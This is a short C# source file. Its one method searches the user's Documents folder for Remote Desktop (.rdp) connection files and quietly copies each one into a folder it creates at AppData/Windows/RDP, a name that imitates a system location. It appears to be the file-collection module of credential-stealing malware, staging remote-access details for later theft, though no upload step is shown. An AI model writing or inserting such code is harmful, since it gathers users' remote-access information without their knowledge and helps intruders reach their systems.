using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace rDr
{
    class rdp
    {
        public static void Rdp()
        {
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            foreach(string fil in files)
            {
                if (Path.GetFileName(fil).EndsWith(".rdp"))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/RDP");
                    File.Copy(fil, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/RDP/" + Path.GetFileName(fil));
                }
            }
        }
    }
}
